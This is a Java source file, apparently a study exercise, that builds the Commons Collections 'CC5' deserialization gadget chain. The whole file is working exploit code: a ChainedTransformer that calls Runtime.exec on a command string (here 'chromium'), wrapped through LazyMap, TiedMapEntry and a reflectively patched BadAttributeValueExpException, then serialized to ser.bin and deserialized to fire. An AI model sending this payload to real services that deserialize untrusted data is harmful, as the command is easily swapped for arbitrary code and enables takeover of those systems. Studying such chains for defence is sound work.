package cc5;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import toolkit.Seriliazation;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;

public class CC5Chain {
    private static String injectedCmd = "chromium";

    public static void main(String[] args) throws Exception {
        cc5();
    }

    public static void cc5() throws Exception {
        /**
         * cc1 后半段
         */
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{injectedCmd}),
                new ConstantTransformer(new HashSet<String>())
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        /**
         * cc5 前半段
         */

        HashMap innerMap = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.lazyMap(innerMap, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "tiedKey");

        // 不传 null 会立刻触发 TiedMapEntry 的 toString
        BadAttributeValueExpException badAttributeValue = new BadAttributeValueExpException(null);

        // 反射修改
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValue, tiedMapEntry);

        Seriliazation.serialize(badAttributeValue);
        Seriliazation.unserialize("ser.bin");
    }
}